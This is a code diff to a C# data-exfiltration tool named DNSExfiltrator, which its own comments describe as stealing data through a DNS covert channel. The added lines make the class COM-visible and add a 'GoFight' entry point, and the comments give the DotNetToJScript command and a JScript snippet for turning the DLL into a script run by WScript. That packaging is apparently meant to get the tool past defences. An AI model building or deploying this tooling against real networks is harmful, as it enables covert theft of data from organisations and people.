@@ -25,8 +25,16 @@ namespace DNSExfiltrator
 	//============================================================================================
 	// This class performs the actual data exfiltration using DNS requests covert channel
 	//============================================================================================
+	[ComVisible(true)]
 	public class DNSExfiltrator
 	{	
+		//------------------------------------------------------------------------------------
+        // Constructors for the the DNSExfiltrator class
+        //------------------------------------------------------------------------------------
+		public DNSExfiltrator()
+        {
+        }
+		
 		//------------------------------------------------------------------------------------
 		// Print usage
 		//------------------------------------------------------------------------------------
@@ -71,6 +79,24 @@ namespace DNSExfiltrator
 			// '=' padding character are removed and will need to be recomputed at the remote end
 			result = Convert.ToBase64String(data).Replace("=","").Replace("/","_").Replace("+","-");
 			return result;
+		}
+		
+		//------------------------------------------------------------------------------------
+		// Required entry point signature for DotNetToJScript
+		// Convert the dnsExfiltrator DLL to a JScript file using this command:
+		// c:\> DotNetToJScript.exe -v Auto -l JScript -c DNSExfiltrator.DNSExfiltrator -o dnsExfiltrator.js dnsExfiltrator.dll
+		//
+		// Then add the following section of code in the generated dnsExfiltrator.js, just after the object creation:
+		//		var args = "";
+		//		for (var i = 0; i < WScript.Arguments.length-1; i++) {
+		//			args += WScript.Arguments(i) + "|";
+		//		}
+		//		args += WScript.Arguments(i);
+		//		o.GoFight(args);
+		//------------------------------------------------------------------------------------
+		public void GoFight(string args)
+		{
+			Main(args.Split('|'));
 		}
 		
 		//------------------------------------------------------------------------------------
